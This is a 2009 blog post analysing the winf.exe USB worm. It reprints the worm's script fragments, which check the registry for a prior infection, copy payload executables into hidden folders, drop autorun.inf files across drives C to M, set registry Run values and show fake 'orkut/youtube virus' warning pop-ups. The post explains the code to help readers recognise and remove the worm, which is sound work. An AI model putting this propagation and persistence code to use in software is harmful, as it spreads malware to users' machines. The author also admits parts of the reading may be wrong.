--- 
layout: post
title: ">winf.exe Disected"
published: true
meta: 
  blogger_author: Vasudev Kamathhttp://www.blogger.com/profile/05106578827322209004noreply@blogger.com
  blogger_blog: blog.copyninja.info
  blogger_permalink: /2009/01/winfexe-disected.html
tags: 
- winf.exe
type: post
status: publish
---
><div style="text-align: justify;">Well folks I got my hand on worm winf.exe from my friends pen drive even thought I couldn't get much because of Avast has deleted harmful viruses. But I could save following files.</div><blockquote style="text-align: justify;">1. install.txt</blockquote><blockquote>2. pathlist.txt</blockquote><blockquote>3.drivelist.txt</blockquote><blockquote>4. thb.ico (which appears as drive icon)</blockquote><blockquote>5. DLL.ico (which is used to mask the programs as DLL file in system folders)</blockquote><blockquote>6. Icon.ico (used to hide winf.exe)</blockquote><br /><div style="text-align: justify;"><br />&nbsp;If you want to see these files just rename winf.exe file to winf.rar and extract files. Well when I went through the files I got a rough idea of its working which I'm going to explain here.</div><br /><blockquote style="text-align: justify;"><span style="font-size: small;">The sfx should be created with the extracting path as %temp% &nbsp; &nbsp; &nbsp;*<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;and the program to run after extract is , winf.exe install.txt *&nbsp;</span></blockquote><div style="text-align: justify;"><br /><br />These lines tell that the install.txt is a input to file wiinf.exe. Next program is supposed to read following entry in registry</div><blockquote style="text-align: justify;"><span style="font-size: small;">HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,status</span>&nbsp;</blockquote><div style="text-align: justify;"><br />If its already infected progrma simply exits. The following lines are used for this.</div><blockquote style="text-align: justify;"><span style="font-size: small;">Regread,regvalue,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,status<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;ifequal,regvalue,present<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp;exitapp</span></blockquote><div style="text-align: justify;"><br /><br />Next it reads the file pathlist.txt which has following contents</div><blockquote style="text-align: justify;"><span style="font-size: small;">C:\WINDOWS\system32\win.dll<br /></span></blockquote><blockquote><span style="font-size: small;">D:\RECYCLE<br /></span></blockquote><blockquote><span style="font-size: small;">E:\RECYCLE<br /></span></blockquote><blockquote><span style="font-size: small;">F:\RECYCLE&nbsp;</span></blockquote><br /><blockquote><span style="font-size: small;">ArrayCount = 0<br /></span></blockquote><blockquote><span style="font-size: small;">Loop, Read,%temp%\winf\pathList.txt<br /></span></blockquote><blockquote><span style="font-size: small;">{<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp;ArrayCount += 1 <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp;Array%ArrayCount% := A_LoopReadLine<br /></span></blockquote><blockquote><span style="font-size: small;">}<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">Loop %ArrayCount%<br /></span></blockquote><blockquote><span style="font-size: small;">{<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp;path1 := Array%A_Index% <br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp;Ifexist,%path1%<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; Ifexist,%path1%\win.exe<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Ifexist,%path1%\std.txt<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exitapp <br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp;FileCreateDir,%path1%<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;if errorlevel<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;continue<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;else<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; {<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Filecopy,%temp%\winf\win.exe,%path1%\<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if errorlevel<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; continue<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\avgs.exe,%path1%\ <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Filecopy,%temp%\winf\drivelist.txt,%path1%\<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Filecopy,%temp%\winf\win.mp3,%path1%\<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Filecopy,%temp%\winf\icon.ico,%path1%\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,%path1%\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\DLL.ico,%path1%\<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; FileCreateDir,%path1%\reg.bkp<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; break<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; }<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; <br /></span></blockquote><blockquote><span style="font-size: small;">}<br /></span></blockquote><blockquote><span style="font-size: small;">Filesetattrib,+SH,%path1%</span></blockquote><div style="text-align: justify;"><br /><br />Well look at the above piece of code. As per my&nbsp;interpretation what happens here is first path is copied into a variable and then checks to see if path already exists and files like win.exe and std.txt is present, this implies the system is already infected and hence program exits. If not present all the files are copied into all the specified path. Then path attribute is changed to such that they act as system files. Last line of above code does this.</div><div style="text-align: justify;">See the following code</div><br /><blockquote style="text-align: justify;"><span style="font-size: small;">Filesetattrib,+SH,%temp%\thb.ico<br /></span></blockquote><blockquote><span style="font-size: small;">Filesetattrib,+SH,%temp%\autorun.inf<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; <br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp;filedelete,c:\autorun.inf<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp;Filecopy,%temp%\winf\thb.ico,c:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;">     </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,c:\ <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; <br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,D:\autorun.inf<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Filecopy,%temp%\winf\thb.ico,D:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,D:\<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,E:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,E:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,E:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,F:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,F:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,F:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,G:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,G:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,G:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,H:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,H:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,H:\<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,I:\autorun.inf</span><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp;</span><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,I:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,I:\<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,J:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,J:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,J:\<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,K:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,K:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,K:\<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,L:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,L:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,L:\<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp;</span><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> filedelete,M:\autorun.inf<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\thb.ico,M:\<br /></span></blockquote><blockquote><span style="white-space: pre;"><span style="font-size: small;"> </span></span><span style="font-size: small;"> Filecopy,%temp%\winf\autorun.inf,M:\ &nbsp;</span> &nbsp; &nbsp; &nbsp; </blockquote><br /><br /><br />Well this code first changes attribute of the files extracted into temp folders to act as sytem files. Further it deletes any autorun.inf file whic may present in the all the drive and then winf.exe, autorun.inf, thb.ico is copied into all the drives. Further it checks to make sure all copies are present and make a backup copy of it. I couldn't properly interpret this part see it below.<br /><br /><br /><br /><blockquote><span style="font-size: small;">ArrayCount = 0<br /></span></blockquote><blockquote><span style="font-size: small;">Loop, Read,%temp%\winf\driveList.txt<br /></span></blockquote><blockquote><span style="font-size: small;">{<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp;ArrayCount += 1 <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp;Array%ArrayCount% := A_LoopReadLine<br /></span></blockquote><blockquote><span style="font-size: small;">}<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">Loop %ArrayCount%<br /></span></blockquote><blockquote><span style="font-size: small;">{<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp;drivename := Array%A_Index% <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;;search in the root of all drives in the drivelist<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; ifexist,%drivename%:\winf.exe &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; {<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; Filecopy,%drivename%:\winf.exe,%path1%\reg.bkp\winf.exe<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; break<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; }<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; else<br /></span></blockquote><blockquote><span style="font-size: small;">&nbsp;&nbsp; &nbsp; &nbsp;continue<br /></span></blockquote><blockquote><span style="font-size: small;">}<br /></span></blockquote><blockquote><span style="font-size: small;">Filesetattrib,+SH,%path1%\reg.bkp\winf.exe</span></blockquote><div style="text-align: justify;"><br /><br />Further it creates a <span style="font-weight: bold;">desktop.ini</span> and <span style="font-weight: bold;">autorun.inf</span> files and fills it with content which is show in the code below.<br /></div><blockquote style="text-align: justify;"><span style="font-size: small;">;*******************************create desktop.ini*************************************<br /></span></blockquote><blockquote><span style="font-size: small;">ifnotexist,%path1%\Desktop.ini<br /></span></blockquote><blockquote><span style="font-size: small;">Fileappend,<br /></span></blockquote><blockquote><span style="font-size: small;">(<br /></span></blockquote><blockquote><span style="font-size: small;">[.ShellClassInfo]<br /></span></blockquote><blockquote><span style="font-size: small;">IconFile=C:\WINDOWS\system32\win.dll\DLL.ico<br /></span></blockquote><blockquote><span style="font-size: small;">IconIndex=0<br /></span></blockquote><blockquote><span style="font-size: small;">),%path1%\Desktop.ini<br /></span></blockquote><blockquote><span style="font-size: small;">Filesetattrib,+SH,%path1%\Desktop.ini<br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;"><br /></span></blockquote><blockquote><span style="font-size: small;">;*******************************create autorun.inf*******************************<br /></span></blockquote><blockquote><span style="font-size: small;">;Open=win.dll.exe<br /></span></blockquote><blockquote><span style="font-size: small;">;shell\open\command=..\winf.exe<br /></span></blockquote><blockquote><span style="font-size: small;">ifnotexist,%path1%\reg.bkp\autorun.inf<br /></span></blockquote><blockquote><span style="font-size: small;">Fileappend,<br /></span></blockquote><blockquote><span style="font-size: small;">(<br /></span></blockquote><blockquote><span style="font-size: small;">[Autorun]<br /></span></blockquote><blockquote><span style="font-size: small;">open=winf.exe<br /></span></blockquote><blockquote><span style="font-size: small;">shellexecute=winf.exe<br /></span></blockquote><blockquote><span style="font-size: small;">shell\Auto\command=winf.exe<br /></span></blockquote><blockquote><span style="font-size: small;">),%path1%\reg.bkp\autorun.inf<br /></span></blockquote><blockquote><span style="font-size: small;">Filesetattrib,+SH,%path1%\reg.bkp\autorun.inf<br /></span></blockquote><blockquote><span style="font-size: small;">;*******************************end of autorun.inf*******************************&nbsp;</span></blockquote><div style="text-align: justify;"><br /><br /><br />Further it writes following registry values.</div><blockquote style="text-align: justify;"><span style="font-size: small;">HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,status,present<br /></span></blockquote><blockquote><span style="font-size: small;">HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,winlogon&nbsp;</span></blockquote><div style="text-align: justify;"><br /><br />Also this virus is the one&nbsp;which&nbsp;pops up message boxes when you visit orkut or youtube. Well this kinda of message you will be getting and also it has a playback sound ;).<br /><br /></div><blockquote style="text-align: justify;"><span style="font-size: small;">message1= &nbsp; &nbsp;msgbox,262160,WARNING,orkut is sending viruses to your pc. To protect your pc close this window ``r``r &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;orkut is infected by jammer worm ,30<br /></span> </blockquote><blockquote><span style="font-size: small;">message2= &nbsp; &nbsp;msgbox,262160,File missing,TCP/IP module Missing from npqtplugin4.dll. it may infected by virus &nbsp;``r``r &nbsp; &nbsp; &nbsp; ,30<br /></span> </blockquote><blockquote><span style="font-size: small;">message3= &nbsp; &nbsp;msgbox,262160,WARNING,Dangerous script send by youtube, Windows system files damage if this script run``r``r &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style="font-size: small;"> </span>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</blockquote><div style="text-align: justify;"><br />Well still there are many things this virus can do I can't explain everything here ;). Whenever you see winf.exe files just scan it once to remove all harmful programs(win.exe, avgs.exe, reg.bkp) then you are left with only text image and a mp3 file.&nbsp;If I interpreted something wrongly here please correct me with you comments.</div>
